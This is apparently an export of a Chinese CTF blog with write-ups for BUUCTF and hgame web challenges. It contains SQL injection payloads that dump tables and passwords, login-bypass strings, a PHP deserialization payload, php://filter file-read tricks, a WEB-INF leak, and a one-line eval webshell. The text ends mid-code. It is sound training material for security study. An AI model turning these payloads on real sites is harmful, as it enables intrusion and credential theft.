<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>order<span class="symbol">%20</span>by<span class="symbol">%204</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/1.png" alt="avatar"></p>
<p>得知有3个字段  接下来就是常规的注入了</p>
<p>爆表</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>table_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>D<span class="symbol">%20</span>database<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/2.png" alt="avatar"></p>
<p>查一下表 l0ve1ysq1</p>
<p>爆字段</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>column_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_name<span class="symbol">%3</span>D<span class="symbol">%20</span><span class="symbol">%27</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>得到三个字段 查一下password</p>
<p>爆数据</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>password<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Knife</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="极客大挑战 2019 Knife"></a>极客大挑战 2019 Knife</h1><p>根据提示<br>我家菜刀丢了，你能帮我找一下么</p>
<p>eval($_POST[“Syc”]);</p>
<p>真·白给题目<br>url:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//6f72969b-3f14-4fb0-bcaa-a5ce479c4a73.node3.buuoj.cn/?Knife.php</span></span><br></pre></td></tr></table></figure>
<p>密码：Syc</p>
<p>菜刀连接 根目录下有flag文件 </p>
<p>访问得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 PHP</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h1><p>打开题目 得到提示备份了网站<br>所以考虑</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">index</span><span class="selector-class">.php</span><span class="selector-class">.bak</span>   失败</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.tar</span>  失败</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.zip</span>  成功</span><br></pre></td></tr></table></figure>
<p>下载到源码后 先查看一下index.php<br>得知用了反序列化的函数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>I have a cat!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#login</span>&#123;   </span></span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line"><span class="css">        <span class="selector-tag">left</span><span class="selector-pseudo">:50</span>%;   </span></span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line"><span class="css">        <span class="selector-tag">margin</span>: 0<span class="selector-class">.67em</span> 0;   </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"world"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;"</span>&gt;</span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;"</span>&gt;</span>不愧是我！！！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;"</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"><span class="php">    $select = $_GET[<span class="string">'select'</span>];</span></span><br><span class="line"><span class="php">    $res=unserialize(@$select);</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 5%;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">"index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来根据包含 查看class.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;username = $username;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;password = $password;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">global</span> $flag;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="php">            </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>根据_destruct（）函数  得知this-&gt;password==100  this-&gt;username==admin时  输出flag</p>
<p>随意在后面添加上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>启动本地PHP环境  访问一下新的class.php<br>得到</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;Syc&#123;dog_dog_dog_dog&#125;</span><br></pre></td></tr></table></figure>

<p>这里不会了 看了一下WP<br>知识点：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以加上加%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">将Name后面的<span class="number">2</span>改为<span class="number">3</span> 是为了绕过__wakeup()  使其username不被覆盖</span><br></pre></td></tr></table></figure>

<p>最后的payload：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>学完JAVA之后 总算对反序列化这玩意 有点概念了  题不算太难 但是挺有意思的  开始我的反序列化之旅</p>
<p>看了WP之后 得知还有用python提交的  更简便  等以后我会更新一下python脚本的方法</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Secret</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Archive_room</span>.</span></span>php</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/0.png" alt="avatar"><br>点击SECRET</p>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
<p>通过抓包确实得到一个action.php的文件<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/2.png" alt="avatar"></p>
<p>放到Reapter中 发包  得到文件secr3t.php </p>
<p>访问得到源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">    $file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($file); </span></span><br><span class="line"><span class="php"><span class="comment">//flag放在了flag.php里</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计之后 构造payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">secr3t.php?<span class="attribute">file</span>=flag.php</span><br></pre></td></tr></table></figure>
<p>发现不太行</p>
<p>使用伪协议读取</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-RoarCTF2019 Easy Java</title>
    <url>/2020/02/03/BUUCTF-RoarCTF2019-Easy-Java/</url>
    <content><![CDATA[<h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>打开环境  根据题目提示是JAVA 点击help<br>得到java.io.FileNotFoundException:{help.docx}</p>
<p>还没做过这种题  看了一下WP</p>
<p>知识点：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml泄露</span><br><span class="line"></span><br><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"></span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure>
<p>用BP抓包  改为POST请求  得到报错<br><img src="/images/BUUCTF/EasyJava/0.png" alt="avatar"></p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">filename</span>=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/EasyJava/1.png" alt="avatar"></p>
<p>读取FlagController.class</p>
<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?filename=WEB-INF/classes/com/wm/ctf/<span class="module-access"><span class="module"><span class="identifier">FlagController</span>.</span></span><span class="keyword">class</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/EasyJava/2.png" alt="avatar"></p>
<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019EasySQL 1</title>
    <url>/2020/02/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL-1/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="极客大挑战 2019 EasySQL"></a>极客大挑战 2019 EasySQL</h1><p>打开题目之后 发现就是一个索然无味的登陆界面</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">输入   密码随意</span><br><span class="line"><span class="number">1</span>  回显</span><br><span class="line"><span class="number">1</span>' 出现报错信息 得知是用单引号保护变量</span><br><span class="line">由于后面还接着password  所以不能使用#等注释符  不然就不会成立</span><br></pre></td></tr></table></figure>

<p>所以直接使用万能密码:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">admin</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>很基础的题  极客大挑战虽然没参加  但是感觉难度应该不是很高  强网杯自闭</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Havefun</title>
    <url>/2020/02/01/BUUCTF-Havefun/</url>
    <content><![CDATA[<h1 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h1><p>这道题做出来的时候 让我一度认为作者是在搞我</p>
<p>查看源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p> payload:<br> /?cat=dog</p>
<p> 得到flag</p>
<p> 八成是个签到题目</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Cosmos的留言板-1</title>
    <url>/2020/01/27/hgame-Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
    <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span><span class="string">' 没有回显，可以知道使用单引号保护变量</span></span><br><span class="line"><span class="string">1'</span>#  没有回显</span><br><span class="line"><span class="number">1</span># 有回显 可以用来查看一下过滤情况</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>#  得知<span class="keyword">select</span>被过滤了</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">column</span><span class="comment">/**/</span>information_schema#  得知常规的<span class="keyword">SQL</span>注入都没有被过滤</span><br></pre></td></tr></table></figure>
<p>最后得知过滤掉了select和空格</p>
<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
<p>再构造payload:</p>
<pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
得到表名 f1aggggggggggggg</code></pre><p>爆字段：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;f1aggggggggggggg&apos;/**/having&apos;1&apos;=&apos;1
得到字段名fl4444444g</code></pre><p>查询：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having&apos;1&apos;=&apos;1</code></pre><p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-cosmos的博客后台</title>
    <url>/2020/01/26/hgame-cosmos%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%90%8E%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="cosmos的博客后台"><a href="#cosmos的博客后台" class="headerlink" title="cosmos的博客后台"></a>cosmos的博客后台</h1><p>太艰难了 自己还是太菜了<br>首先打开环境 hint是flag在根目录下<br>所以尝试一下本地文件包含  但是发现Hacker get out!</p>
<p>再尝试一下用伪协议去读login.php</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://cosmos-<span class="keyword">admin</span>.hgame.day-day.<span class="keyword">work</span>/<span class="keyword">index</span>.php?action=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=<span class="keyword">login</span>.php</span><br></pre></td></tr></table></figure>
<p>再用base64转义一下  得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span 